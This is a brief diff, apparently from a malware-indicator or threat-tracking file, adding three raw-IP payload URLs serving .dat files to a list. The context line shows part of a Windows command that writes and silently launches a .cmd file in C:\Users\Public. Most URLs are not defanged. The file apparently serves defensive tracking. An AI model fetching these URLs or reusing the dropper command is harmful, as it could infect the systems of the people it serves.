@@ -36,6 +36,9 @@ exit')) > C:\Users\Public\1.cmd&&start /min C:\Users\Public\1.cmd nd
 Payload Urls >>
 
 http://216.120.201.100/60852.dat
+http://185.231.204.245/73175.dat
+http://213.169.148.78/83327.dat
+hxxp://5.42.221.117/41067.dat
 
 *************************************************
 
